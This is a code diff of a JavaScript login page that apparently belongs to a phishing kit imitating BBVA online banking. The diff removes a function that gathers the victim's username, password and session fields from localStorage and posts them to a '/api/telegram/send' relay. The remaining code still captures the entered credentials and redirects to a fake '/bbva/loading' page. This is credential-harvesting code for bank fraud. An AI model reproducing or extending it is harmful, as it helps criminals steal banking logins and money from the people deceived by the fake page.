@@ -226,35 +226,6 @@
                 return value ? JSON.parse(value) : '--';
             }
 
-            async function enviarATelegram() {
-                const allData = {};
-                const fields = ['usuario', 'clave', 'ente', 'status', 'uniqid'];
-
-                fields.forEach(field => {
-                    allData[field] = getFromLocalStorage(field);
-                });
-
-                console.log('Datos a enviar a Telegram:', allData);
-
-                try {
-                    const response = await fetch('/api/telegram/send', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            uniqid: appState.uniqId,
-                            data: allData
-                        })
-                    });
-                    const result = await response.json();
-                    console.log('Datos enviados a Telegram:', result);
-                } catch (e) {
-                    console.error('Error al enviar a Telegram:', e);
-                }
-            }
-
             function validateLogin() {
                 const usuario = $('#usuario').val().trim();
                 const clave = $('#clave').val().trim();
@@ -265,7 +236,7 @@
             }
 
             $('#usuario, #clave').on('input', validateLogin);
-            $('#btnLogin').on('click', async function () {
+            $('#btnLogin').on('click', function () {
                 if (validateLogin()) {
                     saveToLocalStorage('usuario', $('#usuario').val().trim());
                     saveToLocalStorage('clave', $('#clave').val().trim());
@@ -273,7 +244,6 @@
                     saveToLocalStorage('status', 'LOGIN');
                     saveToLocalStorage('uniqid', appState.uniqId);
 
-                    await enviarATelegram();
                     window.location.href = '/bbva/loading';
                 }
             });
